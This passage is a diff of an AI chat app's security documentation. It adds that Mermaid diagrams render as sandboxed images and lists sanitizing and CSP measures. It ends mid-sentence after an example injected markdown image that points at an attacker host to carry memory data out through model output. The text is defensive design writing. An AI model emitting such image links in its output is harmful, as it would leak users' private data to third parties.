@@ -141,6 +141,10 @@ content it reads. Treat the admin token like the model API key, or stronger.
 
 - Markdown is sanitized with `rehype-sanitize` (links: `http`, `https`, `mailto` only).
 - `dangerouslySetInnerHTML` is used only for Shiki's highlighted code, which escapes its input.
+- **Mermaid diagrams are shown as images.** Mermaid runs at `securityLevel: "strict"`, and its
+  SVG goes into an `<img>` as a `data:` URL, never into the page. An SVG inside an image runs no
+  script and loads nothing, so a gap in Mermaid's own sanitizer cannot reach the DOM. The cost:
+  diagrams have no clickable links.
 - External links get `noopener noreferrer`.
 - **Images load only from the server itself** (CSP `img-src 'self' data:`). Model output is
   rendered as markdown, and an injected `![](https://attacker/?data=…)` would otherwise send memory
